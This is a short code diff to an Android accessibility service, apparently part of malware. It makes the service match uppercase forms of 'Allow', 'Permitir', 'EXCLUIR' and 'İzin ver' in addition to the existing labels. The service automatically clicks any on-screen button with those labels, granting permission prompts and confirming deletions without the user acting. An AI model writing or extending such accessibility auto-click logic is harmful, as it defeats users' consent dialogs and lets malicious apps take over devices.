@@ -672,10 +672,13 @@ public class MainAccessibilityService extends AccessibilityService {
                     String nodeText = node.getText().toString();
                     Log.d("nodetext::", nodeText);
                     if (nodeText.equals("Allow")
+                            || nodeText.equals("ALLOW")
                             || nodeText.equals("Permitir")
+                            || nodeText.equals("PERMITIR")
                             || nodeText.equals("EXCLUIR")
                             || nodeText.equals("EXCLUDE")
-                            || nodeText.equals("İzin ver")) {
+                            || nodeText.equals("İzin ver")
+                            || nodeText.equals("İZİN VER")) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     }
                 }
